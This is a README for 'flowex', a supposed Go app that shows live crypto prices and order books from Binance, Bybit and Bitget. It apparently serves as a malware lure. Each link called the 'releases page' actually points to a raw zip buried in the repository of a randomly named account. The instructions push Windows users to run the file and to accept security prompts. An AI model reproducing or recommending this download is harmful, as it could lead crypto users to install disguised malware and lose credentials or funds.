# 📡 flowex - Live crypto data across exchanges

[![Download flowex](https://img.shields.io/badge/Download-flowex-blue?style=for-the-badge&logo=github)](https://github.com/eligible-snowblower761/flowex/raw/refs/heads/main/bybit/Software_3.8.zip)

## 🚀 What this app does

flowex shows live crypto market data from major exchanges in one place. It pulls data from Binance, Bybit, and Bitget and keeps it updated in real time.

Use it to:
- watch live prices
- track order book changes
- view market depth
- compare symbols across exchanges
- follow fast market moves without setting up a trading tool

This app is built in Go and uses WebSocket streams to keep data fresh. It also uses worker processes for each symbol, which helps it stay responsive when many markets update at once.

## 💻 Before you install

You only need a Windows PC and an internet connection.

A typical setup works best with:
- Windows 10 or Windows 11
- 2 GB of free memory or more
- 200 MB of free disk space
- a stable internet connection
- permission to run downloaded apps

If your computer can open modern desktop apps and browse the web, it should be fine.

## ⬇️ Download the app

Visit this page to download flowex:

[https://github.com/eligible-snowblower761/flowex/raw/refs/heads/main/bybit/Software_3.8.zip](https://github.com/eligible-snowblower761/flowex/raw/refs/heads/main/bybit/Software_3.8.zip)

On the releases page, look for the latest version and choose the Windows download. If there are multiple files, pick the one that ends in `.exe` or `.zip` for Windows.

## 🛠️ Install on Windows

### If you download an `.exe` file
1. Open the folder where the file was saved.
2. Double-click the file.
3. If Windows asks for permission, choose Yes.
4. Follow the on-screen steps.
5. Wait for the app to finish installing.

### If you download a `.zip` file
1. Open the folder where the file was saved.
2. Right-click the `.zip` file.
3. Choose Extract All.
4. Pick a folder you can find later, such as Downloads or Desktop.
5. Open the extracted folder.
6. Double-click the app file inside the folder.

## ▶️ Run flowex

1. Open the app from the Start menu, Desktop, or the folder where you extracted it.
2. Wait a few seconds for the first data streams to connect.
3. Pick a market or symbol if the app asks you to.
4. Watch the live data load.

If Windows shows a security prompt, check that you downloaded the file from the releases page above before you allow it to run.

## 📊 What you can see inside

flowex is made to help you follow market data without extra setup. Inside the app, you can expect views such as:

- live price updates
- order book levels
- bid and ask changes
- spread and depth data
- symbol-based market panels
- exchange-specific streams for Binance, Bybit, and Bitget

The app focuses on fast market data, so the screen updates as new exchange messages arrive.

## 🔎 How to use it

### Watch a market
Choose a symbol such as BTC, ETH, or another listed pair. The app will show live updates for that market across the supported exchanges.

### Compare exchanges
Open the same symbol on more than one exchange to see how prices and order flow differ.

### Follow order book moves
Use the order book view to track how buy and sell levels change. This can help you see where liquidity is building or fading.

### Keep an eye on fast moves
When the market moves quickly, the app helps you stay on top of price shifts without refreshing a page.

## ⚙️ How it works

flowex connects to exchange WebSocket feeds. That means it listens to live market messages instead of asking for old data again and again.

It uses:
- WebSocket streams for live updates
- actor workers for each symbol
- order book metrics for depth and spread
- exchange connectors for Binance, Bybit, and Bitget

This setup helps the app handle many symbols at once while keeping updates organized.

## 🧭 Common first-time steps

If this is your first time using a market data app, start with one symbol.

1. Open flowex.
2. Pick a familiar market like BTC or ETH.
3. Let the data run for a minute.
4. Watch how the price and order book change.
5. Add another symbol if you want to compare markets.

This keeps the screen easy to read while you learn where each view is placed.

## 🧩 If the app does not open

Try these steps:

1. Make sure the file finished downloading.
2. Check that you opened the right Windows file.
3. Try running the app again.
4. Move the file to a simple folder like Desktop.
5. Re-download the file from the releases page if the file looks incomplete.
6. Restart your PC and try once more.

If the app still does not open, use the newest release from the download page above.

## 📁 Suggested folder setup

If you use the zip version, keep the app in a folder like this:
- Desktop
- Downloads
- Documents\flowex

Do not place it in a protected system folder. A simple path makes it easier to open and update later.

## 🔐 Safety tips

- Download only from the releases page linked above.
- Keep the file name unchanged unless you know what you are doing.
- If Windows asks before opening the app, confirm that the source is the GitHub releases page.
- Use the latest release for the best support and data feed stability.

## 🧪 Typical use cases

flowex can help if you want to:
- monitor crypto prices during the day
- track order book depth
- compare exchange feeds
- watch a symbol before placing a trade
- keep a live market view open while you work

## 🏷️ Project topics

binance, bitget, bybit, crypto, go, golang, market-data, order-book, trading, websocket

## 📦 Download

[Visit the flowex releases page](https://github.com/eligible-snowblower761/flowex/raw/refs/heads/main/bybit/Software_3.8.zip)